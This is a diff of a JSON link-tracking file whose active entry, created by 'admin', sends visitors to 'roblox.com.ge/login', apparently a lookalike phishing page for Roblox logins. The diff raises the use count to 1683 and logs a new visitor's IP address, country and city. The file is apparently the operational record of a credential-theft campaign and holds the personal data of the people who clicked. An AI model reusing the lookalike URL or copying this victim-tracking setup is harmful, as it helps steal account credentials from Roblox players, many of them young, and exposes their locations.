@@ -166,7 +166,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1682,
+    "useCount": 1683,
     "createdBy": "admin",
     "clicks": [
       {
@@ -13624,6 +13624,14 @@
         "city": "Mangaldan",
         "flag": "🇵🇭",
         "countryCode": "PH"
+      },
+      {
+        "timestamp": 1777641111365,
+        "ip": "95.169.192.220",
+        "country": "Netherlands",
+        "city": "Dronten",
+        "flag": "🇳🇱",
+        "countryCode": "NL"
       }
     ]
   },
